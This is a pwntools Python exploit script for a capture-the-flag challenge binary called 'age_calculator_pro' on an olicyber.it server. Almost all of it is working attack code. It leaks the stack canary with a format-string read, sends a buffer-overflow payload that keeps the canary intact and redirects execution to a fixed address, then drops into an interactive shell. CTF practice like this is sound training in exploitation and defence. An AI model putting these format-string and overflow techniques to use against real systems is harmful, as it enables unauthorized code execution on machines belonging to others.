#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'age_calculator_pro')

host = args.HOST or 'agecalculatorpro.challs.olicyber.it'
port = int(args.PORT or 38103)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.info("Leaking canary...")

io.recvlines(8)
io.sendline(b'%17$p')
canary = io.recvline().split(b',')[0].decode()[2:]
canary = int(canary, 16)

log.success("Canary: 0x{:08x}".format(canary))

payload = b'A' * 0x48 + p64(canary) + b'\x00' * 8 + p64(0x004011f6)

log.info("Sending exploit...")
io.sendline(payload)

log.info("Popping shell...")
io.interactive()
io.close()
